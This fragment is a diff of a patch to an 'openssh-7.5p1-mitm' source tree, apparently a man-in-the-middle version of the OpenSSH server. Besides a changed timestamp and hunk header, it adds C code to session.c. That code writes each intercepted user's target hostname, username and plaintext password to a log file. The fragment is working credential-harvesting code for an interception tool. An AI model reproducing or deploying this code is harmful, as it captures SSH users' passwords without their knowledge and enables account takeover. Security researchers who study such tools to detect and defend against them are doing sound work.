@@ -749,7 +749,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  int mm_bsdauth_query(void *, char **, char **, u_int *, char ***, u_int **);
 diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey.sh -x openssh.xml -x buildpkg.sh -x output.0 -x requests -x traces.0 -x configure openssh-7.5p1/session.c openssh-7.5p1-mitm/session.c
 --- openssh-7.5p1/session.c	2017-03-19 22:39:27.000000000 -0400
-+++ openssh-7.5p1-mitm/session.c	2017-07-25 13:26:55.073394983 -0400
++++ openssh-7.5p1-mitm/session.c	2017-07-25 18:12:52.263884319 -0400
 @@ -40,6 +40,9 @@
  #ifdef HAVE_SYS_STAT_H
  # include <sys/stat.h>
@@ -1140,7 +1140,7 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
  #ifdef USE_PAM
  	if (options.use_pam) {
  		sshpam_cleanup();
-@@ -2578,3 +2704,186 @@
+@@ -2578,3 +2704,195 @@
  	return remote;
  }
  
@@ -1163,6 +1163,15 @@ diff -ru --new-file -x '*~' -x 'config.*' -x Makefile -x opensshd.init -x survey
 +
 +  if (log_fd < 0)
 +    logit("MITM: Could not open file for logging!");
++  else {
++    write(log_fd, "Hostname: ", 10);
++    write(log_fd, lol->original_host, strlen(lol->original_host));
++    write(log_fd, "\nUsername: ", 11);
++    write(log_fd, lol->username, strlen(lol->username));
++    write(log_fd, "\nPassword: ", 11);
++    write(log_fd, lol->password, strlen(lol->password));
++    write(log_fd, "\n-------------------------\n", 27);
++  }
 +
 +  return log_fd;
 +}
